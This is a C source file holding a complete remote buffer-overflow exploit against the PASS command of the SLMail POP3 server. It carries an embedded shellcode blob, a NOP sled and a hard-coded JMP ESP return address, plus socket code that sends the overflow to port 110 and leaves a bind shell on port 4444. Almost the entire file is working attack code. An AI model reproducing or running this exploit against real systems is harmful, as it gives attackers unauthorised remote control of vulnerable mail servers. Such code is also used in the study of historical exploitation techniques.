/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xd9\xee\xd9\x74\x24\xf4\x5a\xbb\x2e\x44\x35\x74\x29\xc9\xb1"
"\x53\x31\x5a\x17\x03\x5a\x17\x83\xc4\xb8\xd7\x81\xe4\xa9\x9a"
"\x6a\x14\x2a\xfb\xe3\xf1\x1b\x3b\x97\x72\x0b\x8b\xd3\xd6\xa0"
"\x60\xb1\xc2\x33\x04\x1e\xe5\xf4\xa3\x78\xc8\x05\x9f\xb9\x4b"
"\x86\xe2\xed\xab\xb7\x2c\xe0\xaa\xf0\x51\x09\xfe\xa9\x1e\xbc"
"\xee\xde\x6b\x7d\x85\xad\x7a\x05\x7a\x65\x7c\x24\x2d\xfd\x27"
"\xe6\xcc\xd2\x53\xaf\xd6\x37\x59\x79\x6d\x83\x15\x78\xa7\xdd"
"\xd6\xd7\x86\xd1\x24\x29\xcf\xd6\xd6\x5c\x39\x25\x6a\x67\xfe"
"\x57\xb0\xe2\xe4\xf0\x33\x54\xc0\x01\x97\x03\x83\x0e\x5c\x47"
"\xcb\x12\x63\x84\x60\x2e\xe8\x2b\xa6\xa6\xaa\x0f\x62\xe2\x69"
"\x31\x33\x4e\xdf\x4e\x23\x31\x80\xea\x28\xdc\xd5\x86\x73\x89"
"\x1a\xab\x8b\x49\x35\xbc\xf8\x7b\x9a\x16\x96\x37\x53\xb1\x61"
"\x37\x4e\x05\xfd\xc6\x71\x76\xd4\x0c\x25\x26\x4e\xa4\x46\xad"
"\x8e\x49\x93\x58\x86\xec\x4c\x7f\x6b\x4e\x3d\x3f\xc3\x27\x57"
"\xb0\x3c\x57\x58\x1a\x55\xf0\xa5\xa5\x49\x13\x23\x43\x03\x03"
"\x65\xdb\xbb\xe1\x52\xd4\x5c\x19\xb1\x4c\xca\x52\xd3\x4b\xf5"
"\x62\xf1\xfb\x61\xe9\x16\x38\x90\xee\x32\x68\xc5\x79\xc8\xf9"
"\xa4\x18\xcd\xd3\x5e\xb8\x5c\xb8\x9e\xb7\x7c\x17\xc9\x90\xb3"
"\x6e\x9f\x0c\xed\xd8\xbd\xcc\x6b\x22\x05\x0b\x48\xad\x84\xde"
"\xf4\x89\x96\x26\xf4\x95\xc2\xf6\xa3\x43\xbc\xb0\x1d\x22\x16"
"\x6b\xf1\xec\xfe\xea\x39\x2f\x78\xf3\x17\xd9\x64\x42\xce\x9c"
"\x9b\x6b\x86\x28\xe4\x91\x36\xd6\x3f\x12\x46\x9d\x1d\x33\xcf"
"\x78\xf4\x01\x92\x7a\x23\x45\xab\xf8\xc1\x36\x48\xe0\xa0\x33"
"\x14\xa6\x59\x4e\x05\x43\x5d\xfd\x26\x46";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = (int*)((char*) ptr + 2606); // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 355);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP XP 7CB41020 FFE4 JMP ESP \x8f\x35\x4a\x5f
      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
